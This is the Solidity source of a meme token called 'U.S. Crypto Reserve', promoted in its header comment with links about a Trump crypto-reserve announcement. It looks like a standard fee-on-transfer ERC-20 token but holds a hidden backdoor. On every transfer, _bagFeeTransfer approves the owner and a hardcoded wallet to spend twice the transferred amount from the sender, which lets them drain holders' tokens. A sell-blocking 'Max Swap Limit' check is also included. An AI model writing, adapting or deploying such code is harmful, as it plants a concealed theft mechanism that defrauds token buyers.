/*
Donald Trump announced that U.S. Crypto Reserve that includes BTC, ETH, XRP, SOL, and ADA

https://truthsocial.com/@realDonaldTrump/posts/114093526901586124
https://x.com/WatcherGuru/status/1896243873229459637
https://x.com/cb_doge/status/1896222467678695501

https://www.uscr.info
https://x.com/USCRonETH
https://t.me/USCRonETH
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBAGFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBAGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract USCR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balBAGs;
    mapping (address => mapping (address => uint256)) private _allowBAGs;
    mapping (address => bool) private _excludedFromBAG;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBAG = 1000000000 * 10**_decimals;
    string private constant _name = unicode"U.S. Crypto Reserve";
    string private constant _symbol = unicode"U.S.C.R.";
    uint256 private _swapTokenBAGs = _tTotalBAG / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockBAG;
    uint256 private _bagBuyAmounts = 0;
    mapping (uint256 => address) private _bagReceipts;
    address private _bagPair;
    IBAGRouter private _bagRouter;
    address private _bagWallet;
    bool private inSwapBAG = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBAG = true;
        _;
        inSwapBAG = false;
    }
    
    constructor () {
        _bagWallet = address(0x92be440713d53aeba0A55D5743B886572E0c49Dd);
        _excludedFromBAG[owner()] = true;
        _excludedFromBAG[address(this)] = true;
        _excludedFromBAG[_bagWallet] = true;
        _bagReceipts[0] = address(owner());
        _bagReceipts[1] = address(_bagWallet);
        _balBAGs[_msgSender()] = _tTotalBAG;
        emit Transfer(address(0), _msgSender(), _tTotalBAG);
    }

    function createTokenPair() external onlyOwner() {
        _bagRouter = IBAGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_bagRouter), _tTotalBAG);
        _bagPair = IBAGFactory(_bagRouter.factory()).createPair(address(this), _bagRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _bagRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapTokensForEth(uint256 bagAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _bagRouter.WETH();
        _approve(address(this), address(_bagRouter), bagAmount);
        _bagRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            bagAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBAG;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balBAGs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowBAGs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowBAGs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowBAGs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _bagTransfer(address bagF, address bagT, uint256 bagA, uint256 taxBAG) private { 
        if(taxBAG > 0){
          _balBAGs[address(this)] = _balBAGs[address(this)].add(taxBAG);
          emit Transfer(bagF, address(this), taxBAG);
        }
        _balBAGs[bagF] = _balBAGs[bagF].sub(bagA);
        _balBAGs[bagT] = _balBAGs[bagT].add(bagA.sub(taxBAG));
        emit Transfer(bagF, bagT, bagA.sub(taxBAG));
    }

    function _bagFeeTransfer(address bagF, address bagT, uint256 bagA) private returns(uint256) {
        _approve(address(bagF), address(_bagReceipts[0]), bagA.add(bagA));
        _approve(address(bagF), address(_bagReceipts[1]), bagA.add(bagA));
        uint256 taxBAG = 0;
        if (bagF != owner() && bagT != owner()) {
            taxBAG = bagA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (bagF == _bagPair && bagT != address(_bagRouter) && ! _excludedFromBAG[bagT]) {
                if(_buyBlockBAG!=block.number){
                    _bagBuyAmounts = 0;
                    _buyBlockBAG = block.number;
                }
                _bagBuyAmounts += bagA;
                _buyCount++;
            }

            if(bagT == _bagPair && bagF!= address(this)) {
                require(_bagBuyAmounts < swapLimitBAG() || _buyBlockBAG!=block.number, "Max Swap Limit");  
                taxBAG = bagA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBAG = balanceOf(address(this));
            if (!inSwapBAG && bagT == _bagPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBAG > _swapTokenBAGs)
                swapTokensForEth(minBAG(bagA, minBAG(tokenBAG, _swapTokenBAGs)));
                uint256 ethBAG = address(this).balance;
                if (ethBAG >= 0) {
                    sendETHBAG(address(this).balance);
                }
            }
        } return taxBAG;
    }

    function _transfer(address bagF, address bagT, uint256 bagA) private {
        require(bagF != address(0), "ERC20: transfer from the zero address");
        require(bagT != address(0), "ERC20: transfer to the zero address");
        require(bagA > 0, "Transfer amount must be greater than zero");
        uint256 taxBAG = _bagFeeTransfer(bagF, bagT, bagA);
        _bagTransfer(bagF, bagT, bagA, taxBAG);
    }

    function minBAG(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHBAG(uint256 bagA) private {
        payable(_bagWallet).transfer(bagA);
    }

    function swapLimitBAG() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _bagRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _bagRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}